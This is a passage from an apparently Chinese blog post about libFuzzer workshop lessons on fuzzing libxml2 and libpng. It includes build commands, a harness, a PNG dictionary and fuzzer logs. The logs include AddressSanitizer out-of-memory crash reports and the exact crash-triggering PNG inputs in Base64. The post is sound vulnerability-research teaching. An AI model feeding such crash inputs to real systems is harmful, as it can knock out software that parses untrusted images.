ShuffleBytes-PersAutoDict-ShuffleBytes-ShuffleBytes- DE: &quot;\\x01?&quot;-#86 REDUCE cov: 236 ft: 427 corp: 17/48b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 4 ChangeByte-ChangeBinInt-CopyPart-EraseBytes-#92 NEW cov: 237 ft: 431 corp: 18/49b lim: 4 exec/s: 0 rss: 31Mb L: 1/4 MS: 1 EraseBytes-#103 NEW cov: 237 ft: 433 corp: 19/53b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 1 CopyPart-#104 REDUCE cov: 237 ft: 433 corp: 19/50b lim: 4 exec/s: 0 rss: 31Mb L: 1/4 MS: 1 CrossOver- NEW_FUNC[1/1]: 0x600e30 in xmlFAParseCharClassEsc /home/admin/libfuzzer-workshop/lessons/08/libxml2/xmlregexp.c:4843#115 NEW cov: 243 ft: 439 corp: 20/54b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 1 ChangeByte-#118 NEW cov: 246 ft: 447 corp: 21/58b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 3 CrossOver-PersAutoDict-ChangeBinInt- DE: &quot;\\&quot;\\&quot;&quot;-#134 REDUCE cov: 249 ft: 457 corp: 22/62b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 1 CrossOver-#137 REDUCE cov: 249 ft: 460 corp: 23/64b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 3 InsertByte-EraseBytes-PersAutoDict- DE: &quot;\\x01?&quot;-#145 NEW cov: 250 ft: 461 corp: 24/66b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 3 CopyPart-EraseBytes-ChangeBit-#153 NEW cov: 250 ft: 507 corp: 25/69b lim: 4 exec/s: 0 rss: 31Mb L: 3/4 MS: 3 CrossOver-ShuffleBytes-CopyPart- NEW_FUNC[1/1]: 0x600890 in xmlFAParseCharGroup /home/admin/libfuzzer-workshop/lessons/08/libxml2/xmlregexp.c:5100#165 NEW cov: 254 ft: 511 corp: 26/71b lim: 4 exec/s: 0 rss: 32Mb L: 2/4 MS: 2 InsertByte-ManualDict- DE: &quot;[]&quot;-===================================================================8434==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x18 bytes==8434==ERROR: AddressSanitizer failed to allocate 0x2000 (8192) bytes of InternalMmapVector (error code: 12)ERROR: Failed to mmapMS: 4 ChangeBit-EraseBytes-PersAutoDict-ChangeBit- DE: &quot;[]&quot;-; base unit: 85f707600c5524d8497fd94066e422258633e02f0x7f,0x5b,0xdd,\\x7f[\\xddartifact_prefix='./'; Test unit written to ./crash-dffb37701985bd6539dcbcfe2a04661627b040ffBase64: f1vd 好家伙，这个harness几秒抛出了crash，说明对于的入口函数的选择至关重要。但这次的异常有点奇怪==8434==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x18 bytes描述说申请超出了内存，也没有SUMMARY对漏洞进行定位。因此我们应该意识到问题是出在了harness上，由于在xml_compile_regexp_fuzzer.cc中使用std::vector&lt;uint8_t&gt; buffer(size + 1, 0);对data进行转储，在样例不断增加的过程中vector超出了扩容的内存限制，从而抛出了crash，这并不是测试函数xmlRegexpCompile函数的问题。在另一个对xmlReadMemory的fuzz还在进行，学长说它fuzz这个函数花了十几个小时才出crash。 lesson 09(the importance of seed corpus)这次我们的目标为开源库libpng，首先对源码进行编译 12345678910111213141516171819202122tar xzf libpng.tgzcd libpng# Disable logging via library build configuration control.cat scripts/pnglibconf.dfa | sed -e &quot;s/option STDIO/option STDIO disabled/&quot; \\&gt; scripts/pnglibconf.dfa.tempmv scripts/pnglibconf.dfa.temp scripts/pnglibconf.dfa #这里把错误消息禁用# build the library.autoreconf -f -i#1export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -g -fsanitize=address \\ -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div&quot;./configure CC=&quot;clang&quot; CFLAGS=&quot;$FUZZ_CXXFLAGS&quot;make -j2 #2export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link&quot;CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \\ CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot; ./configuremake -j$(nproc) workshop给出的是#1的编译策略，没有启用采样分析器，而且 -fsanitize-coverage=trace-pc-guard适用在older version的libfuzzer。因此我用的是#2的编译策略，上一个lesson证明这样的编译插桩能有效提高fuzz的效率。提供的harness： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129// Copyright 2015 The Chromium Authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;vector&gt;#define PNG_INTERNAL#include &quot;png.h&quot;struct BufState { const uint8_t* data; size_t bytes_left;};struct PngObjectHandler { png_infop info_ptr = nullptr; png_structp png_ptr = nullptr; png_voidp row_ptr = nullptr; BufState* buf_state = nullptr; ~PngObjectHandler() { if (row_ptr &amp;&amp; png_ptr) { png_free(png_ptr, row_ptr); } if (png_ptr &amp;&amp; info_ptr) { png_destroy_read_struct(&amp;png_ptr, &amp;info_ptr, nullptr); } delete buf_state; }};void user_read_data(png_structp png_ptr, png_bytep data, png_size_t length) { BufState* buf_state = static_cast&lt;BufState*&gt;(png_get_io_ptr(png_ptr)); if (length &gt; buf_state-&gt;bytes_left) { png_error(png_ptr, &quot;read error&quot;); } memcpy(data, buf_state-&gt;data, length); buf_state-&gt;bytes_left -= length; buf_state-&gt;data += length;}static const int kPngHeaderSize = 8;// Entry point for LibFuzzer.// Roughly follows the libpng book example:// http://www.libpng.org/pub/png/book/chapter13.htmlextern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) { if (size &lt; kPngHeaderSize) { return 0; } std::vector&lt;unsigned char&gt; v(data, data + size); if (png_sig_cmp(v.data(), 0, kPngHeaderSize)) { // not a PNG. return 0; } PngObjectHandler png_handler; png_handler.png_ptr = png_create_read_struct (PNG_LIBPNG_VER_STRING, nullptr, nullptr, nullptr); if (!png_handler.png_ptr) { return 0; } png_set_user_limits(png_handler.png_ptr, 2048, 2048); png_set_crc_action(png_handler.png_ptr, PNG_CRC_QUIET_USE, PNG_CRC_QUIET_USE); png_handler.info_ptr = png_create_info_struct(png_handler.png_ptr); if (!png_handler.info_ptr) { return 0; } // Setting up reading from buffer. png_handler.buf_state = new BufState(); png_handler.buf_state-&gt;data = data + kPngHeaderSize; png_handler.buf_state-&gt;bytes_left = size - kPngHeaderSize; png_set_read_fn(png_handler.png_ptr, png_handler.buf_state, user_read_data); png_set_sig_bytes(png_handler.png_ptr, kPngHeaderSize); // libpng error handling. if (setjmp(png_jmpbuf(png_handler.png_ptr))) { return 0; } // Reading. png_read_info(png_handler.png_ptr, png_handler.info_ptr); png_handler.row_ptr = png_malloc( png_handler.png_ptr, png_get_rowbytes(png_handler.png_ptr, png_handler.info_ptr)); // reset error handler to put png_deleter into scope. if (setjmp(png_jmpbuf(png_handler.png_ptr))) { return 0; } png_uint_32 width, height; int bit_depth, color_type, interlace_type, compression_type; int filter_type; if (!png_get_IHDR(png_handler.png_ptr, png_handler.info_ptr, &amp;width, &amp;height, &amp;bit_depth, &amp;color_type, &amp;interlace_type, &amp;compression_type, &amp;filter_type)) { return 0; } // This is going to be too slow. if (width &amp;&amp; height &gt; 100000000 / width) return 0; if (width &gt; 2048 || height &gt; 2048) return 0; int passes = png_set_interlace_handling(png_handler.png_ptr); png_start_read_image(png_handler.png_ptr); for (int pass = 0; pass &lt; passes; ++pass) { for (png_uint_32 y = 0; y &lt; height; ++y) { png_read_row(png_handler.png_ptr, static_cast&lt;png_bytep&gt;(png_handler.row_ptr), NULL); } } return 0;} 对于模糊测试来说，能否写出合适的harness关乎着fuzz最后的结果，我们通常选择涉及内存管理，数据处理等方面的函数作为我们的接口函数去fuzz。这里给出的harness中我们比较容易看到它会首先去通过png_sig_cmp函数去判断输入的data是否符合png的格式，符合才能进入到后面的逻辑中，这一方面是确保data的有效性，同时也提高了数据变异的速率。由于要求输入数据为png的格式，那自然想到使用字典去拼接关键字。这样的想法是正确的，下面比较一下两者的差异：先编译:clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -std=c++11 libpng_read_fuzzer.cc -I libpng libpng/.libs/libpng16.a -fsanitize=fuzzer -lz -o libpng_read_fuzzer使用的也是AFL给出的png.dict: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# Copyright 2016 Google Inc.## Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an &quot;AS IS&quot; BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.################################################################################### AFL dictionary for PNG images# -----------------------------## Just the basic, standard-originating sections; does not include vendor# extensions.## Created by Michal Zalewski &lt;lcamtuf@google.com&gt;#header_png=&quot;\\x89PNG\\x0d\\x0a\\x1a\\x0a&quot;section_IDAT=&quot;IDAT&quot;section_IEND=&quot;IEND&quot;section_IHDR=&quot;IHDR&quot;section_PLTE=&quot;PLTE&quot;section_bKGD=&quot;bKGD&quot;section_cHRM=&quot;cHRM&quot;section_fRAc=&quot;fRAc&quot;section_gAMA=&quot;gAMA&quot;section_gIFg=&quot;gIFg&quot;section_gIFt=&quot;gIFt&quot;section_gIFx=&quot;gIFx&quot;section_hIST=&quot;hIST&quot;section_iCCP=&quot;iCCP&quot;section_iTXt=&quot;iTXt&quot;section_oFFs=&quot;oFFs&quot;section_pCAL=&quot;pCAL&quot;section_pHYs=&quot;pHYs&quot;section_sBIT=&quot;sBIT&quot;section_sCAL=&quot;sCAL&quot;section_sPLT=&quot;sPLT&quot;section_sRGB=&quot;sRGB&quot;section_sTER=&quot;sTER&quot;section_tEXt=&quot;tEXt&quot;section_tIME=&quot;tIME&quot;section_tRNS=&quot;tRNS&quot;section_zTXt=&quot;zTXt&quot;# 先不使用字典： 1234567./libpng_read_fuzzer -max_total_time=60 -print_final_stats=1Done 5454409 runs in 61 second(s)stat::number_of_executed_units: 5454409stat::average_exec_per_sec: 89416stat::new_units_added: 512stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 822 探测到了512个代码单元之后使用字典： 1234567891011121314151617181920212223242526272829303132./libpng_read_fuzzer -max_total_time=60 -print_final_stats=1 -dict=./png.dict#2849333 REDUCE cov: 287 ft: 511 corp: 111/19Kb lim: 4096 exec/s: 105530 rss: 682Mb L: 43/3088 MS: 1 EraseBytes-#2871709 REDUCE cov: 291 ft: 515 corp: 112/19Kb lim: 4096 exec/s: 106359 rss: 682Mb L: 47/3088 MS: 1 ManualDict- DE: &quot;bKGD&quot;-#2883416 NEW cov: 293 ft: 520 corp: 113/19Kb lim: 4096 exec/s: 106793 rss: 682Mb L: 48/3088 MS: 2 PersAutoDict-EraseBytes- DE: &quot;sPLT&quot;-===================================================================26551==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x62474b42 bytes #0 0x51f69d in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 #1 0x5a98a3 in png_read_buffer /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16 #2 0x5a98a3 in png_handle_sPLT /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:1683:13 #3 0x571b3c in png_read_info /home/admin/libfuzzer-workshop/lessons/09/libpng/pngread.c:225:10 #4 0x551b3a in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/09/libpng_read_fuzzer.cc:91:3 #5 0x459a21 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15 #6 0x459265 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3 #7 0x45b507 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19 #8 0x45c225 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5 #9 0x449fe8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6 #10 0x473452 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10 #11 0x7f5d84c2fbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)==26551==HINT: if you don't care about these errors you may set allocator_may_return_null=1SUMMARY: AddressSanitizer: out-of-memory /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 in malloc==26551==ABORTINGMS: 1 ShuffleBytes-; base unit: 1c223175724dec61e3adf94affb1cceec27d30ae0x89,0x50,0x4e,0x47,0xd,0xa,0x1a,0xa,0x0,0x0,0x0,0xd,0x49,0x48,0x44,0x52,0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x63,0x1,0x0,0x0,0x0,0x0,0x4,0x0,0x41,0x41,0x62,0x47,0x4b,0x41,0x73,0x50,0x4c,0x54,0x44,0x41,0x41,0x41,0x41,0x41,0xb9,\\x89PNG\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0dIHDR\\x00\\x00\\x00\\x10\\x00\\x00\\x00c\\x01\\x00\\x00\\x00\\x00\\x04\\x00AAbGKAsPLTDAAAAA\\xb9artifact_prefix='./'; Test unit written to ./crash-ac5ad67d43ac829fd5148d6930a33c17c2ac7143Base64: iVBORw0KGgoAAAANSUhEUgAAABAAAABjAQAAAAAEAEFBYkdLQXNQTFREQUFBQUG5stat::number_of_executed_units: 2888597stat::average_exec_per_sec: 103164stat::new_units_added: 533stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 682 啊这，直接出crash,有点东西。这也再次说明了好的字典使得我们fuzz时的输入数据更具有针对性，当然也提高了触发更多代码单元和获得crash的可能。我使用workshop的#1编译方法在使用dict的情况下cov只有40多，也未能得到crash，因此上面能得到crash也得益于我们的插桩策略。在未使用语料库的情况下就得到了crash实属意料之外，如果我们在使用字典的下情况仍然暂时未得到crash，另一个方法可以去寻找一些有效的输入语料库。因为libfuzzer是进化型的fuzz，结合了产生和变异两个发面。如果我们可以提供一些好的seed，虽然它本身没法造成程序crash，但libfuzzer会在此基础上进行变异，就有可能变异出更好的语料，从而增大程序crash的概率。具体的变异策略需要我们去阅读libfuzzer的源码或者些相关的论文。workshop给我们提供了一些seed： 1234567891011121314151617181920➜ 09 git:(master) ✗ ls seed_corpus anti_aliasing_perspective.png blue_yellow_alpha.png green.png offset_background_filter_1x.pnganti_aliasing.png blue_yellow_alpha_translate.png green_small.png offset_background_filter_2x.pngaxis_aligned.png blue_yellow_anti_aliasing.png green_small_with_blue_corner.png rotated_drop_shadow_filter_gl.pngbackground_filter_blur_off_axis.png blue_yellow_filter_chain.png green_with_blue_corner.png rotated_drop_shadow_filter_sw.pngbackground_filter_blur_outsets.png blue_yellow_flipped.png image_mask_of_layer.png rotated_filter_gl.pngbackground_filter_blur.png blue_yellow_partial_flipped.png intersecting_blue_green.png rotated_filter_sw.pngbackground_filter_on_scaled_layer_gl.png blue_yellow.png intersecting_blue_green_squares.png scaled_render_surface_layer_gl.pngbackground_filter_on_scaled_layer_sw.png blur_filter_with_clip_gl.png intersecting_blue_green_squares_video.png scaled_render_surface_layer_sw.pngbackground_filter.png blur_filter_with_clip_sw.png intersecting_light_dark_squares_video.png spiral_64_scale.pngbackground_filter_rotated_gl.png checkers_big.png mask_bottom_right.png spiral_double_scale.pngbackground_filter_rotated_sw.png checkers.png mask_middle.png spiral.pngblack.png dark_grey.png mask_of_background_filter.png white.pngblending_and_filter.png enlarged_texture_on_crop_offset.png mask_of_clipped_layer.png wrap_mode_repeat.pngblending_render_pass_cm.png enlarged_texture_on_threshold.png mask_of_layer.png yuv_stripes_alpha.pngblending_render_pass_mask_cm.png filter_with_giant_crop_rect.png mask_of_layer_with_blend.png yuv_stripes_clipped.pngblending_render_pass_mask.png force_anti_aliasing_off.png mask_of_replica_of_clipped_layer.png yuv_stripes_offset.pngblending_render_pass.png four_blue_green_checkers_linear.png mask_of_replica.png yuv_stripes.pngblending_transparent.png four_blue_green_checkers.png mask_with_replica_of_clipped_layer.png zoom_filter_gl.pngblending_with_root.png green_alpha.png mask_with_replica.png zoom_filter_sw.png 使用seed_corpus去fuzz: 123456789101112131415161718192021222324252627➜ 09 git:(master) ✗ ./libpng_read_fuzzer seed_corpus#502095 REDUCE cov: 626 ft: 2025 corp: 450/631Kb lim: 19944 exec/s: 4219 rss: 457Mb L: 821/19555 MS: 2 CMP-EraseBytes- DE: &quot;JDAT&quot;-#502951 REDUCE cov: 626 ft: 2025 corp: 450/630Kb lim: 19944 exec/s: 4226 rss: 457Mb L: 2710/19555 MS: 1 EraseBytes-#503447 REDUCE cov: 626 ft: 2025 corp: 450/630Kb lim: 19944 exec/s: 4230 rss: 457Mb L: 467/19555 MS: 1 EraseBytes-===================================================================26681==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x60000008 bytes #0 0x51f69d in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 #1 0x5ad493 in png_read_buffer /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16 #2 0x5ad493 in png_handle_sCAL /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:2323:13 #3 0x571a4c in png_read_info /home/admin/libfuzzer-workshop/lessons/09/libpng/pngread.c:200:10 #4 0x551b3a in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/09/libpng_read_fuzzer.cc:91:3 #5 0x459a21 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15 #6 0x459265 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3 #7 0x45b507 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19 #8 0x45c225 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5 #9 0x449fe8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6 #10 0x473452 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10 #11 0x7fc8e2ee1bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)==26681==HINT: if you don't care about these errors you may set allocator_may_return_null=1SUMMARY: AddressSanitizer: out-of-memory /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 in malloc==26681==ABORTINGMS: 1 ChangeByte-; base unit: 7221de698a693628dcbac00aa34b38a2aca2a9050x89,0x50,0x4e,0x47,0xd,0xa,0x1a,0xa,0x0,0x0,0x0,0xd,0x49,0x48,0x44,0x52,0x0,0x0,0x0,0x27,0x0,0x0,0x0,0xc8,0x8,0x2,0x0,0x0,0x0,0x22,0x3a,0x39,0xc9,0x0,0x0,0x0,0x1,0x73,0x52,0x47,0x42,0x0,0xae,0xce,0x1c,0xe9,0x0,0x0,0x0,0x9,0x70,0x48,0x59,0x73,0x0,0x0,0xb,0x13,0x0,0x0,0xb,0x13,0x1,0x0,0x9a,0x9c,0x18,0x60,0x0,0x0,0x7,0x73,0x43,0x41,0x4c,0x7,0xdd,0xed,0x4,0x14,0x33,0x74,0x49,0x0,0x0,0x0,0x0,0xb7,0xba,0x47,0x42,0x60,0x82,\\x89PNG\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0dIHDR\\x00\\x00\\x00'\\x00\\x00\\x00\\xc8\\x08\\x02\\x00\\x00\\x00\\&quot;:9\\xc9\\x00\\x00\\x00\\x01sRGB\\x00\\xae\\xce\\x1c\\xe9\\x00\\x00\\x00\\x09pHYs\\x00\\x00\\x0b\\x13\\x00\\x00\\x0b\\x13\\x01\\x00\\x9a\\x9c\\x18`\\x00\\x00\\x07sCAL\\x07\\xdd\\xed\\x04\\x143tI\\x00\\x00\\x00\\x00\\xb7\\xbaGB`\\x82artifact_prefix='./'; Test unit written to ./crash-110b2ad7102489b24efc4899bf7d9e55904eb83bBase64: iVBORw0KGgoAAAANSUhEUgAAACcAAADICAIAAAAiOjnJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGGAAAAdzQ0FMB93tBBQzdEkAAAAAt7pHQmCC 也顺利得到了crash，这次的crash和上面的crash有所不同，上面造成crash时的cov只有293，而且造成crash的输入为Base64: iVBORw0KGgoAAAANSUhEUgAAABAAAABjAQAAAAAEAEFBYkdLQXNQTFREQUFBQUG51，而使用seed的话cov达到了626，而且造成crash的数据为Base64: iVBORw0KGgoAAAANSUhEUgAAACcAAADICAIAAAAiOjnJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGGAAAAdzQ0FMB93tBBQzdEkAAAAAt7pHQmCC，要长很多。多数情况下我们同时使用字典和语料库，从产生和变异两个方面去提高样例的威力，双管齐下。 接下来就要分析crash的原因了：ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x60000008 bytes，怎么有点眼熟，好像和lesson 09的报错一样。。但也有所不同，它对错误定位在了in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3，这个是底层malloc的位置，同时有个hint：if you don't care about these errors you may set allocator_may_return_null=1，提示我们这个crash是由于malloc申请失败造成的，也就是/home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16处的malloc: 12345678910111213141516171819if (buffer == NULL) { buffer = png_voidcast(png_bytep, png_malloc_base(png_ptr, new_size)); //此处的png_malloc_base if (buffer != NULL) { png_ptr-&gt;read_buffer = buffer; png_ptr-&gt;read_buffer_size = new_size; } else if (warn &lt; 2) /* else silent */ { if (warn != 0) png_chunk_warning(png_ptr, &quot;insufficient memory to read chunk&quot;); else png_chunk_error(png_ptr, &quot;insufficient memory to read chunk&quot;); } } 定位到问题出在png_malloc_base(png_ptr, new_size)处，由于没有对new_size的大小进行严格限制岛主在malloc时trying to allocate 0x60000008 bytes导致异常崩溃。 总结这一篇操作下来我感觉到对于提高libfuzzer的效率包括在编译插桩、字典使用、语料库选择方面有了更清楚的认识。模糊测试fuzz在软件诞生时就应运而生了，经过了如此长时间的发展，对人们它的研究也在不断深入，并且根据不同的需求开发出了很多个性化的fuzz工具。正所谓理论结合实践，要想对libfuzzer有更深入的了解，我们还是要去分析它的源码，参考各种研究paper。 初学libfuzzer，有错误疏忽之处烦请各位师傅指正。","link":"/2020/12/22/libfuzzer(2)/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"PWN","slug":"PWN","link":"/tags/PWN/"},{"name":"life","slug":"life","link":"/tags/life/"},{"name":"KERNEL","slug":"KERNEL","link":"/tags/KERNEL/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"ARM_PWN","slug":"ARM-PWN","link":"/tags/ARM-PWN/"},{"name":"FUZZ","slug":"FUZZ","link":"/tags/FUZZ/"}],"categories":[]}